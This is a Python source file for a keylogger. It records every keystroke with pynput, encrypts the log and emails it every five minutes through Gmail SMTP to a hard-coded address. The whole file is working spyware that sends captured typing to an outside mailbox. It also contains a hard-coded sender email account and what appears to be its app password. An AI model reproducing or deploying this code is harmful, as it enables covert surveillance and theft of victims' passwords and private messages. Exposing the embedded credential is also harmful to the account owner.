import smtplib
import threading
import time
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from pynput import keyboard
from cryptography.fernet import Fernet

# Configuration
log_file = "keylog.txt"
encrypted_file = "keylog_encrypted.txt"
email_sender = "k.sathyam2003@gmail.com"
email_password = "bgyo numg drov eqho"
email_receiver = "k.pandu2003@gmail.com"
send_interval = 300  # Every 5 minutes

# Generate encryption key (use a fixed key in practice)
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

def encrypt_log():
    try:
        with open(log_file, "rb") as file:
            keylog_data = file.read()
        encrypted_data = cipher.encrypt(keylog_data)
        with open(encrypted_file, "wb") as file:
            file.write(encrypted_data)
        print("Keylog encrypted successfully!")
    except Exception as e:
        print(f"Encryption failed: {e}")

def send_email():
    encrypt_log()
    try:
        with open(encrypted_file, "rb") as file:
            encrypted_data = file.read()

        msg = MIMEMultipart()
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg['Subject'] = "Encrypted Keylog Data"
        msg.attach(MIMEText("Attached is the encrypted keylog data.", 'plain'))

        attachment = MIMEApplication(encrypted_data, Name="keylog_encrypted.txt")
        attachment['Content-Disposition'] = 'attachment; filename="keylog_encrypted.txt"'
        msg.attach(attachment)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_receiver, msg.as_string())
        server.quit()

        print("Encrypted keylog sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Stopping keylogger...")
        send_email()
        return False

def send_periodically():
    while True:
        time.sleep(send_interval)
        send_email()

# Start email sender thread
threading.Thread(target=send_periodically, daemon=True).start()

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
